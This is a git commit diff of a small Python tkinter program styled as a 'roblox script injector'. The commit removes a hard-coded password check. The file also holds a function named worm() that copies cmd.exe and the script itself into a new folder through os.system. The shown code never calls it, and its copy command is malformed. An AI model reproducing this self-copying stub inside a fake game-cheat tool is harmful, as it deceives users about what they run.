ae0ec7d62fab300c030b4d9c5f989fc9cb8c603a
SwagSoSaucy <112739633+SwagSoSaucy@users.noreply.github.com>
2022-10-01 05:37:18 -0400

    Add files via upload

--- 0.py
+++ 0.py
@@ -6,12 +6,9 @@ import os
 import socket
 
 
-print(Fore.GREEN + 'Enter the password')
-x = input()
-if x == 'balls':
-    print('access granted')
 
-    def enter():
+
+def enter():
         win = Tk()
         win.title('REI Script editor')
         win.geometry('1440x600')
@@ -22,11 +19,11 @@ if x == 'balls':
         win.mainloop
 
 
-    def click():
+def click():
         exit()
 
 
-    def worm():
+def worm():
         script = sys.argv
         name=str(script[0])
 
@@ -35,53 +32,49 @@ if x == 'balls':
         os.mkdir('clone')
         os.system(r"copy cmd.exe clone")
         os.system(r"copy" + name + "clone")
-        
+
 
 
 
 
     
 
-    root = Tk()
-    root.title('REI')
-    root.geometry('800x800')
+root = Tk()
+root.title('REI')
+root.geometry('800x800')
     
-    root.config(background="#000000")
-    label = Label(root,text='roblox script injector',font=('Arial',20,'bold'),fg='#FFA500',bg='#000000')
-    label.pack()
-    label2 = Label(root,text='after you have typed the script, press the load button',font=('Arial',20,'bold'),fg='#FFA500',bg='#000000')
-    label2.pack(padx=10, pady=10)
+root.config(background="#000000")
+label = Label(root,text='roblox script injector',font=('Arial',20,'bold'),fg='#FFA500',bg='#000000')
+label.pack()
+label2 = Label(root,text='after you have typed the script, press the load button',font=('Arial',20,'bold'),fg='#FFA500',bg='#000000')
+label2.pack(padx=10, pady=10)
     
-    button = Button(root,text='INJECT ',font=('Arial',40,'bold'),fg='#FFA500',bg="#000000")
-    a = Button(root, text='EXIT',font=('Arial',40,'bold'),fg='#FFA500',bg="#000000")
-    a.pack(side=RIGHT, padx=10, pady=10)
+button = Button(root,text='INJECT ',font=('Arial',40,'bold'),fg='#FFA500',bg="#000000")
+a = Button(root, text='EXIT',font=('Arial',40,'bold'),fg='#FFA500',bg="#000000")
+a.pack(side=RIGHT, padx=10, pady=10)
 
-    a.config(command=click)
-    button.config(command=enter)
+a.config(command=click)
+button.config(command=enter)
 
-    b = Button(root,text='LOAD',font=('Arial',40,'bold'),fg='#FFA500',bg="#000000")
-    b.pack(side=TOP, padx=30, pady=30)
+b = Button(root,text='LOAD',font=('Arial',40,'bold'),fg='#FFA500',bg="#000000")
+b.pack(side=TOP, padx=30, pady=30)
 
-    b.config()
-    
-
-
-
-
-
-    button.pack(side=LEFT, padx=10, pady=10)
-
-
-
-
-
-    root.iconbitmap("DukeWithHelmet.ico")
-    
-    root.mainloop()
+b.config()
     
 
 
-else:
-    print('out of my program')
-    exit()
+
+
+
+button.pack(side=LEFT, padx=10, pady=10)
+
+
+
+input()
+
+root.iconbitmap("DukeWithHelmet.ico")
+
+root.mainloop()
+
+
 
